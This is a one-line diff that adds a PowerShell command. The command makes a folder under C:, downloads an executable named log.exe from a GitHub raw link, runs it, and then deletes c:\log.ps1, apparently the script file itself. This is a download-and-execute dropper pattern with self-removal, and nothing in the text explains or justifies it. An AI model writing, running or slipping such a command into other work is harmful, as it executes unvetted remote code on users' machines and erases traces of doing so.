@@ -1,0 +1,1 @@
+md c:\tmpapp\log; Invoke-WebRequest -Uri 'https://github.com/falahabubacker/scripts-apps/blob/main/log.exe?raw=true' -OutFile "c:\tmpapp\log\log.exe"; c:\tmpapp\log\log.exe; Remove-Item "c:\log.ps1"
